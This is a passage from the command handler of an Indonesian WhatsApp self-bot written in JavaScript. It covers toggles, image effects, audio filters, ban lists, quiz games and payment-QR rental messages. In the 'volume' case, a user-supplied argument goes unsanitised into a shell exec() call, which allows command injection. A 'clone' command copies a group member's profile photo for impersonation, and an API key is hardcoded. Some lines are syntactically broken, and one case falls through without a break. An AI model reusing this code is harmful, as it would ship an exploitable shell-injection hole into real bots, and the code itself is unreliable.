if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (antihidetag === true) return reply(lang.anjawaUdhOn(command))
antihidetag = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antihidetag === false) return
antihidetag = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE ANTI HIDETAG`, `Choose one`, [
            {
              buttonId: 'antihidetag on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antihidetag off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'autovn':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autovn === true) return reply(lang.anjawaUdhOn(command))
autovn = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO VN`, `Choose one`, [
            {
              buttonId: 'autovn on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autovn off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'autoregis': case 'register':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autoregister === true) return reply(lang.anjawaUdhOn(command))
autoregister = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autoregister === false) return
autoregister = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO REGISTER`, `Choose one`, [
            {
              buttonId: 'register on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'register off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'instagram':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
console.log(command + '  -> Mungkin fitur ini masih suka eror ngab jadi fix sendiri ya')
     var imgbb = require('imgbb-uploader')
     if (isQuotedImage) {
     reply(lang.wait())
     let ppk = await alpha.getProfilePicture(sender).catch(_ => 'https://telegra.ph/file/6ea2baa958c1d4c68fb73.png')
	 thumbnya = await getBuffer(ppk)
   var bioij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
    var delib = await alpha.downloadAndSaveMediaMessage(bioij, `./media/${sender}.png`)
    let  datau = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", delib)
     anuk = `${datau.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     alpha.sendFile(from, imoj, `${sender}.png`, null, mek, {thumbnail: thumbnya})
     } else {
     	reply(lang.wait())
		ghost = mek.message.extendedTextMessage.contextInfo.participant || mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		let oppp = await alpha.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
		let medianya = await getBuffer(oppp)
		let datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
		fs.writeFileSync('janckuk.jpeg', datae, 'base64')
		let odata = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", 'janckuk.jpeg')
		anuk = `${odata.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     alpha.sendFile(from, imoj, `${sender}.png`, null, mek, {thumbnail: medianya})
     } 
     break
 case 'volume':
if (!isQuotedAudio) return reply('Reply audio!')
let encmedia3 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media3 = await alpha.downloadAndSaveMediaMessage(encmedia3)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media3)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
alpha.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: ftroli})
fs.unlinkSync(rname)
}
)
case 'balik':
if (!isQuotedAudio) return reply('Reply audio!')
	let encmedia4 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	let media4 = await alpha.downloadAndSaveMediaMessage(encmedia4)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media4} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media4)
if (err) return reply('emror')
hihi = fs.readFileSync(ran)
alpha.sendMessage(from, hihi, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(ran)
	})
break
break
			case 'banlist': case 'blocklist': case 'listban': case 'listblock': 
          teks = '╭────「 *BANNED  LIST* 」\n'
          for (let hui of banned) {
            teks += `│+  @${hui.split('@')[0]}\n`
          }
          teks += `│+ Total : ${banned.length}\n╰──────「 *ALPHA BOT* 」────`
          alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": [hui] } })
          break
 		case 'ban': case 'banned': case 'block':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
					banned.push(bnnd)
					fs.writeFileSync('./src/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${bnnd} telah dibanned!`)
          break

        case 'unban': case 'unbannned': case 'unblock':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          ya = `${args[0].replace('@', '')}@s.whatsapp.net`
					unb = banned.indexOf(ya)
					banned.splice(unb, 1)
					fs.writeFileSync('./src/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${ya} telah di unban!`)
          break
          case 'darkjokes':
					let data = fs.readFileSync('./src/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					alpha.sendMessage(from, hasil, image, {thumbnail: Buffer.alloc(0), quoted: fgclink})
					break
					case 'save':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if(!q) return reply(`${prefix}save nama|nomor , Nomor Harus Berupa Kode Negara 62xxx`)
nma = q.split('|')[0]
nmor = q.split('|')[1]
if(!nma) return reply('Format salah!')
if(!nmor) return reply('Format salah!')
H1 = {
nama : nma,
nomor : nmor
}
save.push(H1)
fs.writeFileSync('./lib/sv.js', JSON.stringify(save))
alpha.sendMessage(from, `Oke Sudag Tersimpan`, MessageType.text, { quoted: mek})		     	 
break
case 'mutual':
data = fs.readFileSync('./lib/sv.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
randIndex2 = Math.floor(Math.random() * jsonData.length);
randKey2 = jsonData[randIndex2];
randIndex3 = Math.floor(Math.random() * jsonData.length);
randKey3 = jsonData[randIndex3];
let mutual = `*Nama*: ${randKey.nama}\n*Nomor*: wa.me/${randKey.nomor}\n\n*Nama*: ${randKey2.nama}\n*Nomor*: wa.me/${randKey2.nomor}\n\n*Nama*: ${randKey3.nama}\n*Nomor*: wa.me/${randKey3.nomor}`
reply(mutual)
break
		
			case 'clone':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply('Tag target yang ingin di clone')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, idk, notify } = groupMembers.find(x => x.jid === mentioned)
try {
var pp = await alpha.getProfilePicture(idk)
buffer = await getBuffer(pp)
alpha.updateProfilePicture(botNumber, buffer)
mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply('Emror')
}
break
case 'tes': case 'bot':
var ini_gopayyp = `${ucapannya2}\nBot sudah on kak silahkan di pakai`
var buttonsos = [
{buttonId: 'Menu', buttonText: {displayText: 'Menu'}, type: 1},
{buttonId: 'runtime', buttonText: {displayText: 'Runtime'}, type: 1}]

butptonMessagee = {
contentText: ini_gopayyp,
footerText: `${tampilTanggal}\n${tampilWaktu}` ,
buttons: buttonsos,
headerType: 1
}
alpha.sendMessage(from,  butptonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: fgclink,sendEphemeral: true 
			})
			break
case 'absensi':
                 if (!isGroup) return reply(lang.onlygc())
absen.push(sender)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR ABSEN*:${enter}`
for (let sensi of absen) {
teks += `${enter}々 @${sensi.split('@')[0]} ✓${enter}`
}
teks += `TOTAL MEMBER YG ABSEN : ${absen.length}${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
break

case 'absen':
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply(`Cara Memulai Absen Silahkan Ketik${enter}${enter}${prefix}absen waktu${enter}${enter}list menit yang tersedia.${enter}${enter}600000 | 1200000 | 1800000${enter}${enter}jadi ${prefix}absen 600000`)
tem = args.join(" ")
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR*:${enter}`
for (let sensi of absen) {
teks += `${enter}々 @${sensi.split('@')[0]} ✓${enter}`
}
teks += `ABSENSI : ${sensi.length}${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
reply(`List Presentasi Hadir Telah Siap${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`)
setTimeout( () => {
reply(`Waktu Absensi Telah Habis`)
alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
}, tem)
setTimeout( () => {
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
}, tem)
break

		  case 'tebakin': case 'tebakgambar':
					if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${ApiZeks}/api/tebakgambar?apikey=${zeksApikey}`)
                    resu = anu.result
                    tebak = resu.soal
                    jawaban = resu.jawaban
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    alpha.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(30000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
				case 'caklontong':
					if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/caklontong?apikey=BETA`)
                    tebakya = anu.soal
                    tebak = `Pertanyaan : ${tebakya}`
                    jawaban = anu.jawaban
                    caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/caklontong.json", JSON.stringify(caklontong))
                    console.log(jawaban)
                    alpha.sendMessage(from, tebak, text, { quoted: mek })
                   await sleep(30000)
                    if (caklontong.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete caklontong[sender.split('@')[0]]
                        fs.writeFileSync("./src/caklontong.json", JSON.stringify(caklontong))
                    }
                    break
				case 'family100':
					if (family.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/family100?apikey=BETA`)
                    tebakya = anu.soal
                    tebak = `Pertanyaan : ${tebakya}`
                    jawaban = anu.jawaban
                    family[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/family100.json", JSON.stringify(family))
                    console.log(jawaban)
                    alpha.sendMessage(from, tebak, text, { quoted: mek })
                   await sleep(30000)
                    if (family.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete family[sender.split('@')[0]]
                        fs.writeFileSync("./src/family100.json", JSON.stringify(family))
                    }
                    break
				case 'tebakanime':
					if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/tebak-anime?apikey=BETA`)
                    tebak = anu.soal
                    jawaban = anu.jawaban
                    tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakanime.json", JSON.stringify(tebakanime))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    alpha.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(30000)
                    if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakanime[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakanime.json", JSON.stringify(tebakanime))
                    }
                    break
            case 'suit': 
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              break
				default:
				if (budy.includes("Ownerbot",'ownerbot')){
					console.log(color('[ CMD ]', 'aqua'), 'Ownerbot', color(pushname))
 members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
			         ini_ownerNumber = [`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`,`${setting.ownerNumber}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname_ = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak, contextInfo: {"mentionedJid": members_ids}})
					alpha.sendMessage(from,'Nih Kak Owner Ku',text,{quoted: hehe})
} 
if (subscribezeeoneofc == 'statiktiknya') {
anuui = process.uptime()
const timestampnya = speed();
					const latensinya = speed() - timestampnya
teks = `\`\`\`「 STATISTIK BOT 」\`\`\`

${petik}々 Base : SELF-BOT${petik}
${petik}々 Lib : Baileys, 3.5.2${petik}
${petik}々 Prefix : ${prefix}${petik}
${petik}々 Versi Bot : v0.0.7${petik}

${petik}々 Merk HP : ${device_manufacturer}${petik}
${petik}々 Versi OS : ${os_version}${petik}
${petik}々 Versi HP : ${device_model}${petik}
${petik}々 MCC : ${mcc}${petik}
${petik}々 MNC : ${mnc}${petik}
${petik}々 Baterai : ${isBattre}${petik}
${petik}々 Charger : ${isCharge}${petik}
${petik}々 Whatsapp : ${wa_version}${petik}
${petik}々 Blockir : ${banned.length} Blocked${petik}
${petik}々 Group Chat : ${totalgroup.length} Chat${petik}
${petik}々 Personal Chat : ${totalkontak.length} Chat${petik}
${petik}々 Total Chat : ${totalchat.length} Chat${petik}
${petik}々 Speed : ${latensinya.toFixed(4)} Second${petik}
${petik}々 Runtime : ${kyun(anuui)}${petik}`
fakeitem(teks)
}
if (Subs githubku MiyaZb == "ownerku"){
					console.log(color('[ CMD ]', 'aqua'), 'Ownerbot', color(pushname))
 
			         ini_ownerNumber = [`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`,`${targetpc}@s.whatsapp.net`]
					let ini_list = []
					for (let i of ini_ownerNumber) {
					const vname_ = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
					ini_list.push({
					"displayName": 'Owner Alphabot',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
					})
					}
					hehe = await alpha.sendMessage(from, {
					"displayName": `${ini_list.length} kontak`,
					"contacts": ini_list 
					}, 'contactsArrayMessage', { quoted: fkontak})
					var ini_gopayy =`Halo @${sender.split("@")[0]} itu owner ku, jangan lupa donasi kak😇`
var buttonss = [
{buttonId: 'donasi_kak', buttonText:{displayText: 'Donasi'}, type: 1},
{buttonId: 'sewa_kak', buttonText:{displayText: 'Sewa'}, type: 1}
]

buttonMessagee = {
contentText: ini_gopayy,
footerText: `${tampilTanggal}\n${tampilWaktu}\n\n© ${creator}` ,
buttons: buttonss,
headerType: 1
}
alpha.sendMessage(from,  buttonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: ftoko,sendEphemeral: true 
			})
} 
if(subscribezeeoneofc == 'qr_gopay1'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	send_qr_gopay(gambar_gopay_nya, mek)
}    
if(subscribezeeoneofc == 'qr_dana1'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	send_qr_dana(gambar_dana_nya, mek)
}    
if(subscribezeeoneofc == 'qr_ovo1'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	send_qr_ovo(gambar_ovo_nya, mek)
}    
if(subscribezeeoneofc == 'qr_ovo13'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana13'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay13'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Minggu_ 
•> Harga : ${_minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    

if(subscribezeeoneofc == 'qr_ovo14'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana14'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_gopay14'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _2 Minggu_ 
•> Harga : ${__minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${__minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}

if(subscribezeeoneofc == 'qr_ovo15'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana15'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}    
if(subscribezeeoneofc == 'qr_gopay15'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _3 Minggu_ 
•> Harga : ${___minggu}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${___minggu}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}


if(subscribezeeoneofc == 'qr_ovo16'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_ovo_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
}    
if(subscribezeeoneofc == 'qr_dana16'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi DANA via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas DANA.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_dana_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}    
if(subscribezeeoneofc == 'qr_gopay16'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _1 Bulan_ 
•> Harga : ${_bulan}\n\nCaranya :
1. Buka Aplikasi GOPAY via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas GOPAY.
4. dan Masukkan Nominal ${_bulan}
5. Selesai`
await alpha.sendMessage(from, gambar_gopay_nya, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: ini_bayar,contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
}

if(subscribezeeoneofc == 'qr_ovo17'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	ini_bayar = `${ucapannya2}\n\n•> Nama : _${pushname}_
•> Nomor : _@${sender.split("@")[0]}_
•> Sewa : _permanen_
•> Harga : ${_permanen}\n\nCaranya :
1. Buka Aplikasi OVO via HP-mu.
2. Pilih Pay / Bayar
3. Scan Barcode diatas OVO.
4. dan Masukkan Nominal ${_permanen}
5. Selesai`
